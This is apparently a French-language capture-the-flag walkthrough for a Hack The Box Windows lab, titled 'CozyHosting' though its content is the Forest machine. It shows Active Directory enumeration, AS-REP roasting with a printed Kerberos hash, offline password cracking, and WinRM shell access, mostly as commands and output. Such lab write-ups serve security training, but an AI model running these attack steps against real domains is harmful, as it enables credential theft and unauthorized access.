---
tags:
  - Easy
  - Windows
---

# CozyHosting

![Forest](img_Forest/logo.png)

## Information Générales

- **Difficulté** : Easy
- **Système d'exploitation** : Windows


## Walkthrough

### Enumeration

#### Nmap

```bash
$ nmap -sV $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 09:36 BST
Nmap scan report for 10.129.92.214
Host is up (0.081s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 08:43:07Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Domain controller : htb.local
LDAP (389/TCP)
SMB (445/TCP)

#### RPC / NetBios / SMB

```bash
rpcclient -U "" -N -c enumdomusers $ip
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

##### LDAP Enumeration

```bash
$ nmap -n -sV --script "ldap* and not brute" $ip
```

ou

```bash
$ ldapsearch -H ldap://$ip -x -s base namingcontexts
```

```bash
$ ldapsearch -H ldap://$ip -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

DC=htb
DC=local


```bash
$ ldapsearch -H ldap://$ip -x -b DC=htb,DC=local
```

Il y a beacuoup d'inf, donc on va trier pour avoir que les comptes

```bash
$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://$ip | grep userPrincipalName
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local
```

### Initial Access

#### ASREPRoastPermalink

Extract TGTs.

```bash
$ impacket-GetNPUsers -dc-ip $ip -request 'htb.local/' -format hashcat
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-09 10:43:58.514412  2019-09-23 12:09:47.931194  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:32570c110b6d6d77d86c08a2c535ef45$bc539a7c34d13861d7343506fbd5f9ae488419cfb79fa288b6f8b88cc39d5755967cbdea240deae77bed5d05a23c5b599ac4f844235b796e02427c9378088abe0cdf17c40ac4a7a3d677e887bdbe1c396cf2f3066fc64dace7118636ece0196d05a3891ca8b43f30363aefdcb4baa4a8d5427c782c56cdde7636ff95e32c52d11c370455bbdff8ed45302e208e487716f69da1e8649e85ec669c0326873887e6d9b047ba26075674866a280fcbbbd237b3d64fa18ac2ce144b230acbd1ce1e61b71b7245bb48f51be9a909574a51a439f46cb0e71c12c2af9484948f8002fb8ac9b57d2d0094
```

#### John The Ripper

```bash
$ john -w=/usr/share/wordlists/rockyou.txt $hash_file 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

svc-alfresco:s3rvice

#### WinRM Access

Try to use WinRM (TCP/5985) and see if we have a remote access.

```bash
$ crackmapexec winrm $ip -u svc-alfresco -p s3rvice -d htb.local
HTTP        10.129.92.214   5985   10.129.92.214    [*] http://10.129.92.214:5985/wsman
WINRM       10.129.92.214   5985   10.129.92.214    [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

svc-alfresco can PS-Remote to forest.htb.local.

```bash
$ evil-winrm -i $ip -u svc-alfresco  -p s3rvice 

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type "C:/Users/svc-alfresco/Desktop/user.txt"
015c2e6e01b640ce3782ee318832f6e3
```

